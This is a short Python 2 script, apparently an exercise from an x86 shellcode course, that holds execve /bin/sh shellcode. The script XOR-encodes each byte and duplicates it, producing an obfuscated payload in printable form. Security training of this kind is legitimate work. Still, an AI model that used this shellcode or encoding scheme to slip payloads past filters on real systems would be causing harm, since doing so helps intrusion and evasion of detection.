#Author : Dibyendu Sikdar
#https://github.com/dibsy/SLAEx86/
#PA-1191

shellcode = ('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')
#shellcode = ('\xa1\xb2\c3\d4')

encoded_with_0x = ''
encoded_with_slash_x = ''
original_shellcode = ''
not_encoded_shellcode = ''
for byte in bytearray(shellcode):
	
	original_shellcode += '0x%02x,' % byte
	
	
	#print 'byte: '+str(byte)
	#print '02x: %02x' % byte
	encoded_with_slash_x += '\\x'
	encoded_with_slash_x += '%02x' % (byte^0x1)
	encoded_with_slash_x += '\\x%02x' % (byte^0x1)


	encoded_with_0x += '0x'
	encoded_with_0x += '%02x,' % (byte^0x1)
	encoded_with_0x += '0x%02x,' % (byte^0x1)

print original_shellcode
print '\n'
print encoded_with_slash_x
print '\n'
print encoded_with_0x
print '\n'
print "Length of custom shellcode:"+str(len(shellcode)*2)
